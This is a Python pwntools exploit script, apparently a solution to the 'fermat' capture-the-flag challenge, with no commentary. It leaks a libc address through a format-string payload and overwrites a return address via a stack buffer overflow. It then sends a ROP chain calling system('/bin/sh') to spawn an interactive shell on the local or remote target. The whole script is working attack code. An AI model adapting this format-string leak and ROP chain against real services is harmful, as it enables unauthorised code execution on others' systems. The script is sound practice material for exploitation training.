#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.terminal = "alacritty -e".split()


def conn():
    if args.REMOTE:
        io = remote("fermat.chal.imaginaryctf.org", 1337)
    else:
        if args.GDB:
            io = gdb.debug([exe.path], aslr=False, api=False, gdbscript="""
            set follow-fork-mode parent
            """)
        else:
            io = process([exe.path])
            #gdb.attach(io)
    return io


def main():
    io = conn()
    rbp = p64(0)
    payload = "AA"
    payload += "%p %p %p %p %p %p %p %p %p %p"
    payload = payload.ljust(256, "@").encode()
    io.send(payload + rbp + b"\x89")
    io.recvuntil("AA")
    leaks = io.recvuntil(b"@")[:-1].split(b" ")
    info(f"leaks: {leaks}")
    libc_leak = int(leaks[3], 16)
    info(f"libc_leak: {hex(libc_leak)}")
    libc.address = libc_leak - 2207504

    rop = ROP(libc)
    rop.raw(rop.find_gadget(['ret'])[0])
    rop.system(next(libc.search(b"/bin/sh")))
    print(rop.dump())
    
    io.send(b"A" * 256 + rbp + bytes(rop))
    io.interactive()


if __name__ == "__main__":
    main()
